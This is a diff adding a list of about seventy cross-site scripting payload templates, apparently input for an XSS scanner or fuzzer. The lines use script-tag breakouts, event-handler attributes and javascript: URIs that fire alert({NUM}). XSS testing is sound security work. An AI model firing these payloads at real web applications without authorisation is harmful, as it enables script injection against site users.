@@ -1,0 +1,71 @@
+alert({NUM})
+)alert({NUM})
+;alert({NUM})
+alert({NUM});
+;alert({NUM});
+);alert({NUM})
+);alert({NUM});
+});alert({NUM})
+});alert({NUM});
+}});alert({NUM})
+}});alert({NUM});
+alert({NUM})</script>
+)alert({NUM})</script>
+;alert({NUM})</script>
+alert({NUM});</script>
+;alert({NUM});</script>
+);alert({NUM})</script>
+);alert({NUM});</script>
+});alert({NUM})</script>
+});alert({NUM});</script>
+}});alert({NUM})</script>
+}});alert({NUM});</script>
+onmouseover ="alert({NUM})
+onclick ="alert({NUM})
+onfocus ="alert({NUM})
+<script>alert({NUM})</script>
+</script>">'><script>alert({NUM})</script>
+<img src=x onerror=alert({NUM});>
+<img src="http://www.w3school.com.cn/ui/head_index.gif" onload=alert({NUM});>
+<img src '//"%0Aonerror=alert({NUM})>
+<img src ?itworksonchrome?\/onerror = alert({NUM})>
+<img '//"%0Aonerror=alert({NUM})// src=1>
+<img style="xss:expression(alert({NUM}))">
+</script><img src="javascript:alert({NUM});">
+</script><img src=x onerror=alert({NUM});>
+</script><img src="http://www.w3school.com.cn/ui/head_index.gif" onload=alert({NUM});>
+</script><img src '//"%0Aonerror=alert({NUM})>
+</script><img src ?itworksonchrome?\/onerror = alert({NUM})>
+</script><img '//"%0Aonerror=alert({NUM})// src=1>
+</script><img style="xss:expression(alert({NUM}))">
+<iframe src=javascript:alert({NUM});height=0 width=0/><iframe>
+<iframe/onload=alert({NUM})>
+</script><iframe src=javascript:alert({NUM});height=0 width=0/><iframe>
+</script><iframe/onload=alert({NUM})>
+<a onmouseover="alert({NUM})">xxs link</a>
+<a href="javascript:alert({NUM})">xss</a>
+<a href="data:text/html;blabla,<script>alert({NUM})</script>">Click Me</a>
+</script><a onmouseover="alert({NUM})">xxs link</a>
+</script><a href="javascript:alert({NUM})">xss</a>
+</script><a href="data:text/html;blabla,<script>alert({NUM})</script>">Click Me</a>
+<input onfocus=alert({NUM})>
+<input onmouseover=alert({NUM})>
+<input onclick=alert({NUM})>
+</script><input onfocus=alert({NUM})>
+</script><input onmouseover=alert({NUM})>
+"><script>alert({NUM})</script>//
+</script><input onclick=alert({NUM})>
+<svg onload=alert({NUM})>
+</script><svg onload=alert({NUM})>
+<select onfocus=alert({NUM})>
+<select onclick=alert({NUM})>
+<select onmouseover=alert({NUM})>
+</script><select onfocus=alert({NUM})>
+</script><select onclick=alert({NUM})>
+</script><select onmouseover=alert({NUM})>
+<textarea onfocus=alert({NUM})>
+<textarea onclick=alert({NUM})>
+<textarea onmouseover=alert({NUM})>
+</script><textarea onfocus=alert({NUM})>
+</script><textarea onclick=alert({NUM})>
+</script><textarea onmouseover=alert({NUM})>
